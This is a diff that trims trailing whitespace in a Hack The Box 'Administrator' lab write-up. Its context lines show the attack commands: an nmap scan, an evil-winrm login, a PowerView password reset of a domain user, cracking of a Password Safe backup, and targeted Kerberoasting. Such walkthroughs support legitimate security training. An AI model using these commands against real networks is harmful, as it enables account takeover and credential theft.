@@ -17,7 +17,7 @@ If you are an active HTB pentester, please only read this if you completed the b
 I started out by running a normal port scan `nmap -sV -T5 administrator.htb`:
 ```
 21/tcp   open  ftp           Microsoft ftpd
-| ftp-syst: 
+| ftp-syst:
 |_  SYST: Windows_NT
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-04 21:45:35Z)
@@ -43,16 +43,16 @@ I tried a couple things at first, spraying the password for other users, seeing 
 
 ```
 ┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
-└─# evil-winrm -i administrator.htb -u olivia -p ichliebedich                                                                                                                       
-                                        
+└─# evil-winrm -i administrator.htb -u olivia -p ichliebedich
+
 Evil-WinRM shell v3.5
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\olivia\Documents> 
+*Evil-WinRM* PS C:\Users\olivia\Documents>
 ```
 
 ## Olivia -> Michael
@@ -76,7 +76,7 @@ Now that we've gathered our data, we can check if Olivia has any special privile
 PS C:\...> import-module .\PowerView.ps1
 
 PS C:\...> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-PS C:\...> Set-DomainUserPassword -Identity Michael -AccountPassword $UserPassword 
+PS C:\...> Set-DomainUserPassword -Identity Michael -AccountPassword $UserPassword
 ```
 
 We can confirm this worked via netexec:
@@ -109,7 +109,7 @@ When debating over what I should do I thought I should give FTP another try with
 There I found a file `Backup.psafe3`
 ```
 ┌──(root㉿kali)-[~/htb/Machines/Medium/Administrator]
-└─# ftp benjamin@administrator.htb 
+└─# ftp benjamin@administrator.htb
 Connected to administrator.htb.
 220 Microsoft FTP Service
 331 Password required
@@ -121,7 +121,7 @@ ftp> ls
 125 Data connection already open; Transfer starting.
 10-05-24  08:13AM                  952 Backup.psafe3
 226 Transfer complete.
-ftp> 
+ftp>
 ```
 While I've never had the luxury of cracking a `psafe3` file, it follows a very similar path to a `kdbx` file, which I've cracked alot of. For `psafe3`, we can use `pwsafe2john` to get the hash of the file and crack it using `john`.
 
@@ -143,7 +143,7 @@ Let's start with a `GenericWrite` privilege over the Ethan account. Contrary to 
 we'll be using [this](https://github.com/ShutdownRepo/targetedKerberoast) tool with the suggested command from bloodhound:
 ```
 ┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
-└─# python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -f hashcat 
+└─# python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -f hashcat
 
 <...>
 ```
@@ -151,7 +151,7 @@ we'll be using [this](https://github.com/ShutdownRepo/targetedKerberoast) tool w
 If you get a clock skew error, you have to manually set your time to match the machine:
 ```
 ┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
-└─# timedatectl set-ntp off     
+└─# timedatectl set-ntp off
 ┌──(root㉿kali)-[~/…/Machines/Medium/Administrator/targetedKerberoast]
 └─# rdate -n administrator.htb
 Sat Jan  4 18:25:08 EST 2025
